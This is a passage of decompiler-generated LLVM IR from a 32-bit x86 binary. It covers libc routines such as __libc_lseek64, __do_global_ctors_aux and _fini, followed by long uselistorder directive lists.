  %v2_804fe3f = load i32, i32* %arg2, align 4
  %v1_804fe45 = add i32 %arg1, 4
  %v2_804fe45 = inttoptr i32 %v1_804fe45 to i32*
  %v3_804fe45 = load i32, i32* %v2_804fe45, align 4
  %v4_804fe48 = call i32 @__libc_lseek64(i32 %v3_804fe45, i32 %v2_804fe3f, i32 %v3_804fe3c, i32 %arg3)
  %v0_804fe50 = load i32, i32* @edx, align 4
  %v2_804fe50 = icmp slt i32 %v0_804fe50, 0
  store i32 %v4_804fe48, i32* %ecx.global-to-local, align 4
  br i1 %v2_804fe50, label %dec_label_pc_804fe5d, label %dec_label_pc_804fe56

dec_label_pc_804fe56:                             ; preds = %entry
  %v1_804fe56 = load i32, i32* @ebx, align 4
  %v2_804fe56 = inttoptr i32 %v1_804fe56 to i32*
  store i32 %v4_804fe48, i32* %v2_804fe56, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_804fe5a = load i32, i32* @edx, align 4
  %v1_804fe5a = load i32, i32* @ebx, align 4
  %v2_804fe5a = add i32 %v1_804fe5a, 4
  %v3_804fe5a = inttoptr i32 %v2_804fe5a to i32*
  store i32 %v0_804fe5a, i32* %v3_804fe5a, align 4
  %v0_804fe5e.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804fe5d

dec_label_pc_804fe5d:                             ; preds = %entry, %dec_label_pc_804fe56
  %v0_804fe5e = phi i32 [ %v4_804fe48, %entry ], [ %v0_804fe5e.pre, %dec_label_pc_804fe56 ]
  ret i32 %v0_804fe5e

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder i32 4, { 73, 74, 75, 76, 77, 78, 6, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 50, 89, 137, 138, 90, 139, 140, 57, 91, 7, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 30, 31, 71, 58, 109, 110, 111, 244, 147, 148, 149, 143, 141, 142, 144, 145, 146, 0, 8, 150, 151, 152, 153, 154, 155, 156, 157, 158, 32, 51, 112, 113, 114, 33, 34, 35, 159, 45, 1, 245, 134, 9, 10, 160, 161, 52, 162, 163, 164, 165, 166, 167, 168, 169, 170, 53, 171, 172, 173, 174, 59, 36, 175, 176, 177, 178, 37, 38, 39, 60, 40, 41, 61, 42, 179, 43, 180, 62, 44, 63, 64, 11, 246, 247, 249, 250, 254, 255, 256, 248, 46, 70, 12, 115, 116, 117, 118, 65, 185, 186, 187, 54, 181, 182, 183, 184, 119, 120, 121, 122, 123, 55, 13, 124, 125, 251, 253, 196, 197, 198, 199, 200, 201, 14, 202, 203, 204, 205, 206, 207, 208, 209, 194, 195, 210, 48, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 28, 231, 232, 49, 233, 15, 126, 252, 127, 128, 188, 189, 47, 190, 191, 192, 193, 2, 16, 3, 129, 130, 131, 17, 132, 18, 29, 19, 20, 21, 22, 133, 23, 135, 56, 136, 24, 25, 26, 234, 27, 66, 67, 69, 235, 68, 236, 237, 238, 239, 240, 241, 242, 4, 5, 243, 72 }
  uselistorder label %dec_label_pc_804fe5d, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804fe66 = load i32, i32* @ebx, align 4
  store i32 %v0_804fe66, i32* %stack_var_-12, align 4
  %v2_804fe6e = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804fe6e, i32* %esi.global-to-local, align 4
  %v1_804fe88 = call i32 @int80_syscall(i32 140)
  store i32 %v1_804fe88, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_804fe88, -4095
  br i1 %tmp16, label %dec_label_pc_804fea2, label %dec_label_pc_804fe94

dec_label_pc_804fe94:                             ; preds = %entry
  %v1_804fe94 = call i32 @__errno_location(i32 %arg3)
  %v0_804fe99 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fe99 = sub i32 0, %v0_804fe99
  %v2_804fe9b = inttoptr i32 %v1_804fe94 to i32*
  store i32 %v1_804fe99, i32* %v2_804fe9b, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fea6

dec_label_pc_804fea2:                             ; preds = %entry
  %v1_804fea2 = icmp eq i32 %v1_804fe88, 0
  br i1 %v1_804fea2, label %dec_label_pc_804feab, label %dec_label_pc_804fea6

dec_label_pc_804fea6:                             ; preds = %dec_label_pc_804fea2, %dec_label_pc_804fe94
  %v0_804fea6 = phi i32 [ %v1_804fe88, %dec_label_pc_804fea2 ], [ -1, %dec_label_pc_804fe94 ]
  %v1_804fea8 = ashr i32 %v0_804fea6, 31
  br label %dec_label_pc_804feb3

dec_label_pc_804feab:                             ; preds = %dec_label_pc_804fea2
  %v3_804feab = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_804feb3

dec_label_pc_804feb3:                             ; preds = %dec_label_pc_804fea6, %dec_label_pc_804feab
  %v0_804feb9 = phi i32 [ %v0_804fea6, %dec_label_pc_804fea6 ], [ %v3_804feab, %dec_label_pc_804feab ]
  %storemerge = phi i32 [ %v1_804fea8, %dec_label_pc_804fea6 ], [ %tmp, %dec_label_pc_804feab ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_804feb6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804feb6, i32* @ebx, align 4
  ret i32 %v0_804feb9

; uselistorder directives
  uselistorder i32 %v1_804fe88, { 1, 2, 0, 3 }
  uselistorder i32* @edx, { 14, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 87, 30, 31, 32, 3, 88, 89, 90, 91, 92, 93, 33, 94, 95, 4, 96, 97, 98, 99, 34, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 13, 53, 54, 36, 55, 5, 56, 57, 59, 6, 60, 61, 62, 63, 64, 17, 7, 58, 205, 206, 207, 208, 8, 209, 210, 100, 101, 104, 102, 103, 105, 106, 107, 108, 109, 110, 111, 65, 69, 66, 67, 68, 112, 113, 114, 115, 116, 117, 118, 125, 119, 120, 121, 122, 123, 124, 0, 15, 82, 126, 127, 128, 129, 212, 130, 131, 132, 136, 133, 134, 135, 137, 138, 139, 140, 200, 9, 1, 16, 83, 141, 214, 145, 215, 146, 70, 71, 72, 73, 199, 216, 217, 222, 221, 84, 74, 149, 150, 10, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 11, 164, 165, 147, 148, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 12, 191, 192, 193, 194, 195, 218, 75, 142, 143, 144, 81, 76, 77, 211, 223, 213, 196, 78, 219, 220, 79, 80, 85, 86, 197, 198, 201, 2, 202, 203, 204, 224 }
  uselistorder i32 31, { 9, 10, 11, 12, 13, 14, 15, 20, 21, 7, 6, 22, 16, 17, 18, 2, 3, 0, 1, 8, 4, 5, 19 }
  uselistorder i32 (i32)* @__errno_location, { 61, 60, 59, 29, 58, 28, 57, 56, 55, 54, 20, 40, 26, 25, 53, 39, 19, 38, 37, 36, 32, 31, 35, 47, 18, 17, 16, 15, 30, 14, 52, 13, 12, 11, 51, 10, 23, 8, 9, 42, 41, 50, 49, 48, 27, 1, 46, 34, 21, 45, 4, 22, 44, 7, 3, 2, 0, 33, 43, 6, 5, 24 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_804feb3, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_804fecc = load i32, i32* @global_var_8052000.69, align 8192
  %v10_804fed1 = icmp eq i32 %v0_804fecc, -1
  br i1 %v10_804fed1, label %dec_label_pc_804feec, label %dec_label_pc_804fee0.preheader

dec_label_pc_804fee0.preheader:                   ; preds = %entry
  br label %dec_label_pc_804fee0

dec_label_pc_804fee0:                             ; preds = %dec_label_pc_804fee0.preheader, %dec_label_pc_804fee0
  %v4_804fee3 = phi i32 [ %v0_804fecc, %dec_label_pc_804fee0.preheader ], [ %v2_804fee5, %dec_label_pc_804fee0 ]
  %v0_804fee0 = phi i32 [ ptrtoint (i32* @global_var_8052000.69 to i32), %dec_label_pc_804fee0.preheader ], [ %v1_804fee0, %dec_label_pc_804fee0 ]
  %v1_804fee0 = add i32 %v0_804fee0, -4
  call void @__pseudo_call(i32 %v4_804fee3)
  %v1_804fee5 = inttoptr i32 %v1_804fee0 to i32*
  %v2_804fee5 = load i32, i32* %v1_804fee5, align 4
  %v10_804fee7 = icmp eq i32 %v2_804fee5, -1
  %v1_804feea = icmp eq i1 %v10_804fee7, false
  br i1 %v1_804feea, label %dec_label_pc_804fee0, label %dec_label_pc_804feec.loopexit

dec_label_pc_804feec.loopexit:                    ; preds = %dec_label_pc_804fee0
  %v2_804feec.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804feec

dec_label_pc_804feec:                             ; preds = %dec_label_pc_804feec.loopexit, %entry
  %v2_804feec = phi i32 [ %v2_804feec.pre, %dec_label_pc_804feec.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_804feec

; uselistorder directives
  uselistorder i32 %v0_804fecc, { 1, 0 }
  uselistorder i1 false, { 416, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 64, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 253, 254, 255, 129, 130, 256, 32, 257, 1, 131, 49, 66, 132, 133, 258, 4, 2, 3, 6, 259, 260, 262, 261, 5, 264, 263, 265, 134, 135, 50, 136, 7, 137, 266, 267, 268, 65, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 158, 157, 159, 160, 161, 162, 163, 165, 30, 166, 164, 167, 169, 168, 8, 170, 171, 173, 172, 51, 174, 175, 176, 177, 178, 67, 179, 180, 75, 76, 181, 77, 78, 182, 183, 79, 184, 185, 68, 80, 186, 187, 188, 189, 190, 69, 191, 70, 81, 71, 192, 72, 193, 194, 195, 73, 196, 74, 197, 82, 198, 199, 200, 86, 87, 417, 418, 46, 276, 33, 34, 271, 275, 273, 274, 52, 269, 270, 272, 277, 278, 279, 280, 281, 201, 203, 204, 205, 206, 202, 207, 208, 211, 47, 209, 48, 210, 282, 283, 289, 35, 284, 285, 287, 286, 290, 291, 296, 295, 292, 293, 294, 9, 0, 419, 10, 227, 228, 229, 53, 297, 298, 299, 302, 300, 301, 11, 36, 303, 305, 304, 54, 306, 308, 307, 55, 309, 310, 420, 56, 421, 12, 311, 312, 313, 314, 315, 316, 317, 348, 323, 37, 13, 318, 319, 320, 321, 322, 324, 325, 38, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 390, 391, 393, 392, 14, 230, 231, 232, 233, 338, 339, 349, 350, 351, 212, 431, 432, 433, 434, 436, 57, 437, 438, 435, 430, 422, 85, 83, 234, 235, 236, 237, 238, 239, 15, 342, 16, 340, 341, 213, 423, 424, 425, 426, 427, 428, 429, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 352, 365, 366, 367, 368, 369, 370, 371, 372, 373, 31, 375, 374, 379, 376, 377, 378, 17, 380, 381, 214, 215, 343, 344, 345, 346, 225, 288, 223, 218, 216, 217, 58, 219, 18, 220, 221, 222, 224, 226, 240, 241, 242, 243, 244, 245, 248, 84, 246, 247, 59, 60, 249, 250, 251, 252, 347, 382, 383, 384, 385, 386, 63, 387, 39, 388, 40, 389, 394, 395, 411, 396, 397, 398, 399, 404, 408, 409, 410, 19, 400, 61, 401, 402, 403, 41, 23, 405, 22, 42, 21, 406, 407, 20, 412, 24, 413, 43, 414, 25, 26, 27, 44, 28, 415, 45, 29, 88, 62, 439 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 5, 6, 7, 2, 31, 32, 33, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 34, 35, 36, 37, 41, 42, 43, 44, 3, 45, 0, 40, 46, 47, 48, 49, 50, 51, 4, 39, 1, 38, 52, 29, 30 }
  uselistorder i32 ptrtoint (i32* @global_var_8052000.69 to i32), { 0, 2, 3, 4, 1 }
  uselistorder i32 -1, { 0, 1, 50, 154, 51, 155, 264, 156, 157, 158, 52, 159, 161, 160, 48, 25, 162, 163, 39, 32, 44, 164, 265, 165, 111, 53, 54, 166, 55, 167, 143, 168, 169, 45, 170, 115, 171, 40, 172, 173, 174, 57, 56, 175, 144, 41, 176, 58, 59, 60, 42, 145, 177, 266, 178, 61, 62, 179, 43, 180, 30, 267, 268, 31, 181, 182, 269, 183, 63, 184, 185, 186, 152, 153, 187, 188, 26, 112, 64, 189, 275, 65, 66, 190, 67, 2, 3, 142, 270, 191, 4, 5, 6, 70, 69, 68, 192, 109, 110, 36, 35, 34, 193, 194, 71, 195, 27, 277, 196, 278, 279, 197, 198, 280, 199, 37, 200, 201, 202, 72, 146, 281, 282, 73, 203, 7, 204, 205, 283, 284, 9, 10, 285, 286, 130, 206, 131, 132, 122, 124, 125, 126, 127, 128, 129, 123, 28, 121, 113, 118, 207, 119, 120, 133, 134, 117, 135, 136, 137, 138, 139, 140, 141, 114, 116, 8, 208, 287, 288, 209, 289, 290, 298, 74, 210, 75, 211, 46, 47, 212, 76, 77, 213, 78, 214, 79, 215, 80, 216, 81, 217, 82, 218, 83, 219, 84, 220, 85, 221, 86, 222, 11, 223, 49, 87, 224, 89, 88, 90, 225, 91, 226, 38, 227, 92, 228, 229, 299, 230, 231, 12, 293, 294, 15, 14, 16, 17, 18, 93, 19, 94, 20, 232, 13, 295, 29, 233, 234, 235, 147, 236, 21, 291, 292, 95, 273, 274, 33, 276, 96, 237, 97, 238, 98, 239, 99, 240, 100, 241, 101, 242, 102, 243, 103, 244, 104, 245, 105, 246, 106, 247, 107, 248, 108, 249, 22, 250, 148, 251, 252, 271, 272, 297, 296, 253, 149, 254, 23, 255, 24, 256, 257, 258, 259, 260, 261, 262, 263, 150, 151 }
  uselistorder i32 1, { 351, 353, 352, 140, 99, 229, 230, 120, 122, 121, 123, 266, 0, 355, 354, 66, 67, 356, 64, 578, 357, 62, 63, 293, 579, 580, 581, 231, 292, 358, 582, 583, 584, 232, 585, 586, 370, 369, 368, 367, 366, 365, 364, 363, 362, 361, 360, 359, 175, 174, 171, 167, 173, 166, 168, 170, 169, 172, 587, 588, 1, 59, 58, 57, 56, 55, 371, 176, 177, 372, 107, 106, 659, 373, 151, 589, 590, 374, 153, 152, 154, 233, 375, 50, 591, 376, 165, 162, 164, 160, 161, 163, 267, 268, 379, 378, 377, 660, 215, 572, 661, 211, 662, 111, 663, 234, 664, 665, 124, 666, 667, 592, 593, 349, 380, 114, 594, 381, 382, 269, 668, 339, 178, 595, 596, 573, 236, 597, 598, 599, 600, 601, 603, 604, 605, 237, 606, 607, 325, 235, 608, 238, 609, 610, 611, 602, 386, 385, 384, 383, 33, 35, 34, 30, 31, 32, 36, 612, 387, 96, 93, 95, 94, 239, 388, 613, 614, 390, 389, 23, 22, 615, 616, 574, 575, 270, 617, 271, 618, 619, 620, 240, 621, 294, 622, 393, 392, 391, 155, 158, 157, 156, 159, 241, 295, 2, 296, 394, 822, 823, 824, 395, 47, 46, 48, 45, 398, 397, 396, 49, 399, 400, 91, 242, 243, 669, 216, 212, 670, 321, 671, 672, 673, 289, 674, 3, 340, 98, 97, 675, 676, 402, 401, 180, 179, 181, 677, 403, 678, 404, 182, 679, 680, 405, 184, 183, 185, 623, 624, 625, 626, 627, 628, 629, 630, 631, 409, 408, 407, 341, 406, 342, 52, 51, 53, 54, 632, 633, 412, 411, 410, 343, 344, 88, 86, 89, 85, 87, 90, 272, 681, 682, 208, 265, 683, 684, 244, 685, 290, 687, 688, 413, 39, 273, 692, 689, 690, 691, 217, 416, 415, 414, 149, 150, 419, 418, 417, 38, 420, 693, 421, 92, 646, 647, 648, 245, 649, 694, 695, 696, 422, 202, 201, 203, 204, 291, 697, 698, 699, 700, 246, 84, 297, 298, 299, 701, 423, 300, 301, 702, 247, 4, 425, 424, 186, 302, 426, 146, 427, 102, 101, 825, 429, 428, 187, 188, 274, 826, 430, 189, 303, 206, 304, 703, 704, 705, 706, 707, 708, 709, 710, 711, 434, 433, 432, 431, 65, 305, 712, 713, 306, 307, 714, 436, 435, 437, 190, 438, 100, 308, 439, 209, 715, 716, 213, 717, 248, 218, 718, 719, 720, 721, 722, 723, 724, 249, 442, 441, 440, 725, 726, 727, 728, 729, 730, 731, 732, 5, 733, 250, 734, 735, 736, 251, 737, 738, 252, 739, 740, 741, 742, 743, 309, 350, 444, 443, 15, 14, 16, 275, 276, 795, 796, 797, 798, 219, 650, 651, 652, 445, 42, 744, 745, 746, 447, 446, 26, 25, 24, 448, 827, 449, 126, 125, 127, 450, 108, 451, 103, 452, 104, 453, 43, 455, 454, 112, 456, 191, 457, 105, 458, 192, 459, 193, 460, 194, 461, 463, 462, 44, 464, 40, 466, 465, 143, 467, 471, 470, 469, 468, 113, 828, 829, 830, 473, 472, 27, 28, 831, 277, 475, 474, 478, 477, 476, 195, 278, 326, 571, 310, 479, 653, 654, 655, 656, 480, 20, 19, 21, 17, 18, 279, 481, 12, 13, 747, 576, 214, 748, 327, 749, 345, 482, 117, 116, 115, 118, 483, 81, 78, 77, 79, 83, 82, 80, 72, 69, 71, 73, 68, 70, 311, 485, 484, 312, 486, 313, 487, 314, 489, 488, 328, 492, 491, 490, 196, 315, 755, 756, 757, 493, 109, 758, 759, 220, 760, 761, 762, 76, 74, 75, 329, 754, 253, 197, 198, 200, 199, 316, 763, 764, 765, 766, 767, 768, 769, 770, 771, 254, 772, 773, 774, 775, 776, 282, 777, 778, 207, 283, 779, 780, 781, 782, 280, 281, 783, 784, 785, 496, 495, 494, 131, 130, 129, 133, 132, 284, 285, 497, 286, 287, 255, 501, 500, 499, 498, 137, 330, 502, 503, 504, 505, 506, 750, 6, 751, 317, 227, 318, 752, 7, 511, 510, 509, 508, 507, 60, 61, 512, 513, 642, 643, 515, 514, 136, 135, 134, 686, 516, 518, 517, 41, 519, 119, 521, 520, 29, 522, 110, 523, 144, 525, 524, 147, 526, 145, 527, 205, 529, 528, 138, 530, 141, 532, 531, 139, 533, 148, 142, 634, 221, 322, 228, 635, 8, 9, 210, 636, 637, 638, 639, 640, 641, 288, 256, 331, 319, 332, 539, 538, 537, 536, 535, 534, 346, 333, 644, 645, 541, 540, 657, 658, 577, 542, 128, 753, 545, 544, 543, 786, 787, 546, 323, 334, 257, 788, 789, 553, 552, 551, 550, 549, 548, 547, 790, 791, 10, 335, 792, 258, 259, 793, 794, 556, 555, 554, 347, 799, 800, 557, 560, 559, 558, 801, 802, 336, 810, 811, 226, 812, 561, 320, 11, 563, 562, 260, 803, 223, 804, 805, 261, 806, 222, 808, 809, 262, 337, 338, 807, 348, 813, 564, 814, 815, 37, 816, 817, 263, 818, 819, 820, 224, 566, 565, 264, 821, 324, 225, 567, 569, 568, 570 }
  uselistorder label %dec_label_pc_804fee0, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_804fef7 = load i32, i32* @ebx, align 4
  %v1_804fef8 = call i32 @__get_pc_thunk_bx(i32 %v0_804fef7)
  store i32 %v1_804fef8, i32* @eax, align 4
  %v0_804ff03 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_804ff03

; uselistorder directives
  uselistorder i32* @eax, { 15, 47, 48, 74, 49, 51, 50, 52, 53, 55, 46, 54, 22, 76, 0, 3, 77, 78, 2, 79, 1, 21, 75, 80, 23, 81, 56, 57, 59, 16, 58, 82, 87, 83, 84, 85, 86, 4, 5, 88, 89, 90, 24, 91, 92, 93, 94, 95, 96, 97, 98, 99, 25, 100, 101, 102, 26, 27, 103, 104, 105, 106, 28, 107, 129, 146, 108, 31, 29, 109, 30, 110, 111, 112, 113, 32, 33, 114, 115, 34, 116, 35, 117, 36, 37, 38, 118, 119, 120, 121, 39, 122, 123, 124, 125, 40, 148, 149, 44, 150, 151, 153, 45, 154, 6, 152, 9, 14, 147, 126, 17, 60, 61, 62, 63, 130, 132, 133, 131, 134, 135, 137, 138, 136, 127, 41, 7, 18, 64, 65, 66, 19, 20, 67, 68, 69, 70, 71, 72, 43, 73, 10, 128, 42, 11, 139, 140, 12, 141, 142, 143, 155, 144, 145, 8, 13 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 449, 450, 364, 451, 452, 453, 8, 183, 97, 96, 454, 455, 184, 456, 457, 365, 458, 459, 460, 461, 720, 83, 462, 98, 463, 14, 84, 75, 464, 160, 99, 465, 76, 466, 366, 467, 227, 468, 469, 470, 471, 472, 473, 474, 100, 367, 475, 476, 477, 478, 101, 479, 368, 157, 228, 102, 369, 370, 371, 103, 480, 185, 481, 482, 483, 484, 186, 222, 223, 485, 486, 487, 488, 489, 490, 372, 187, 491, 77, 373, 492, 104, 188, 189, 493, 494, 229, 721, 722, 723, 374, 495, 496, 497, 498, 375, 724, 725, 376, 499, 85, 500, 161, 377, 378, 501, 105, 502, 726, 9, 10, 11, 80, 48, 379, 727, 730, 728, 729, 380, 731, 0, 106, 503, 504, 230, 505, 107, 381, 506, 162, 507, 49, 108, 508, 509, 510, 732, 733, 734, 231, 735, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 109, 382, 523, 190, 524, 525, 526, 527, 528, 15, 16, 383, 176, 177, 529, 530, 531, 532, 110, 533, 534, 535, 384, 536, 17, 18, 111, 385, 537, 538, 539, 542, 540, 541, 19, 44, 50, 543, 544, 545, 546, 224, 547, 548, 112, 549, 550, 551, 552, 553, 554, 555, 556, 114, 557, 558, 559, 386, 560, 561, 163, 164, 562, 563, 564, 115, 113, 565, 116, 566, 567, 387, 568, 569, 570, 571, 572, 573, 574, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 117, 388, 389, 118, 587, 588, 589, 390, 391, 590, 591, 592, 593, 594, 595, 596, 597, 392, 393, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 394, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 191, 395, 192, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 193, 639, 640, 641, 642, 643, 644, 645, 20, 51, 52, 53, 54, 646, 647, 648, 649, 650, 651, 119, 652, 396, 653, 654, 655, 656, 343, 657, 658, 659, 660, 661, 662, 120, 397, 81, 41, 72, 575, 165, 73, 916, 917, 918, 919, 920, 921, 922, 923, 1, 166, 663, 925, 210, 745, 738, 739, 740, 21, 42, 741, 742, 743, 398, 744, 88, 89, 90, 736, 737, 121, 746, 747, 749, 750, 748, 751, 194, 752, 753, 754, 755, 756, 757, 123, 124, 399, 232, 233, 664, 400, 665, 122, 666, 667, 668, 669, 670, 671, 57, 58, 672, 673, 674, 357, 675, 56, 401, 55, 402, 125, 126, 403, 12, 404, 676, 13, 405, 127, 234, 406, 407, 128, 408, 760, 409, 758, 175, 759, 235, 236, 129, 130, 43, 410, 761, 762, 763, 764, 765, 237, 411, 412, 195, 926, 927, 131, 766, 22, 59, 707, 78, 79, 413, 767, 60, 414, 23, 132, 768, 61, 415, 769, 416, 771, 770, 167, 417, 418, 772, 774, 773, 168, 419, 775, 928, 929, 169, 931, 930, 62, 238, 420, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 196, 786, 133, 421, 422, 787, 134, 788, 423, 789, 790, 856, 135, 424, 136, 239, 795, 791, 792, 793, 794, 86, 24, 796, 797, 798, 799, 800, 801, 807, 808, 809, 810, 802, 803, 804, 805, 806, 63, 64, 425, 811, 812, 65, 66, 67, 426, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 137, 896, 897, 138, 898, 899, 900, 68, 87, 197, 91, 427, 831, 198, 199, 688, 933, 934, 857, 858, 859, 240, 860, 935, 92, 200, 861, 936, 678, 677, 937, 938, 939, 679, 680, 940, 891, 941, 139, 942, 947, 948, 25, 428, 26, 95, 429, 430, 957, 958, 170, 959, 140, 344, 241, 242, 954, 2, 943, 944, 945, 141, 447, 356, 946, 708, 709, 710, 711, 431, 432, 712, 713, 714, 201, 142, 143, 433, 681, 434, 682, 144, 435, 145, 436, 833, 69, 834, 835, 836, 837, 838, 3, 437, 832, 438, 683, 684, 685, 686, 439, 146, 949, 345, 147, 202, 950, 953, 952, 864, 203, 865, 866, 867, 868, 204, 869, 870, 871, 243, 862, 244, 863, 245, 440, 441, 246, 346, 442, 247, 347, 148, 443, 872, 873, 149, 150, 248, 348, 94, 45, 46, 874, 875, 876, 877, 878, 879, 151, 152, 249, 349, 93, 880, 171, 881, 82, 882, 883, 885, 444, 884, 4, 687, 5, 951, 689, 690, 691, 692, 694, 693, 839, 445, 205, 840, 446, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 901, 47, 924, 153, 695, 960, 892, 696, 932, 961, 962, 886, 852, 697, 955, 956, 158, 252, 350, 159, 27, 154, 206, 250, 358, 698, 155, 207, 251, 699, 253, 351, 700, 254, 352, 211, 701, 353, 702, 255, 703, 225, 704, 705, 706, 256, 208, 28, 29, 715, 359, 360, 257, 716, 718, 258, 259, 717, 172, 719, 361, 178, 262, 260, 261, 354, 355, 263, 853, 854, 855, 209, 362, 264, 887, 179, 180, 181, 182, 266, 888, 265, 267, 212, 889, 890, 268, 893, 894, 895, 363, 213, 269, 271, 215, 270, 214, 216, 30, 272, 273, 274, 275, 276, 911, 31, 32, 74, 33, 219, 220, 902, 903, 904, 905, 173, 217, 218, 221, 906, 907, 908, 909, 34, 35, 36, 910, 226, 37, 38, 912, 70, 39, 40, 71, 277, 278, 6, 7, 913, 914, 915, 156, 448, 174, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 963, 964, 965, 966, 967, 968, 969, 970 }
  uselistorder i32* @ebx, { 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 194, 195, 47, 48, 49, 50, 1, 51, 52, 53, 2, 54, 3, 55, 56, 196, 4, 197, 198, 199, 5, 200, 201, 202, 203, 204, 205, 206, 57, 58, 59, 207, 208, 209, 210, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 211, 212, 213, 214, 6, 215, 7, 216, 217, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 105, 106, 8, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 9, 120, 121, 122, 123, 124, 125, 33, 34, 35, 36, 100, 102, 101, 103, 104, 421, 422, 10, 423, 424, 427, 428, 126, 127, 128, 429, 430, 431, 218, 220, 223, 224, 225, 226, 227, 221, 219, 222, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 249, 11, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 262, 260, 261, 432, 433, 434, 435, 436, 437, 438, 439, 440, 263, 264, 176, 177, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 441, 12, 442, 443, 444, 445, 28, 13, 26, 446, 447, 448, 449, 450, 451, 285, 286, 287, 288, 289, 290, 291, 14, 292, 15, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 356, 357, 17, 314, 305, 303, 304, 306, 309, 307, 308, 310, 311, 312, 16, 313, 315, 316, 317, 318, 319, 320, 321, 18, 322, 19, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 156, 157, 158, 455, 456, 457, 458, 358, 20, 359, 360, 459, 460, 361, 362, 461, 141, 462, 463, 464, 465, 466, 142, 467, 413, 414, 363, 364, 365, 468, 469, 470, 31, 32, 474, 475, 476, 489, 490, 491, 492, 29, 21, 27, 477, 483, 487, 488, 471, 472, 473, 188, 189, 143, 144, 145, 146, 147, 337, 340, 22, 0, 341, 338, 339, 149, 342, 343, 344, 148, 150, 151, 481, 482, 152, 153, 154, 155, 366, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 23, 381, 382, 367, 368, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 30, 394, 395, 396, 397, 398, 24, 399, 400, 401, 402, 403, 404, 405, 406, 407, 479, 480, 159, 160, 161, 345, 346, 347, 348, 349, 350, 25, 351, 352, 353, 425, 426, 162, 163, 164, 493, 494, 415, 416, 165, 166, 167, 452, 453, 454, 495, 496, 497, 498, 408, 409, 354, 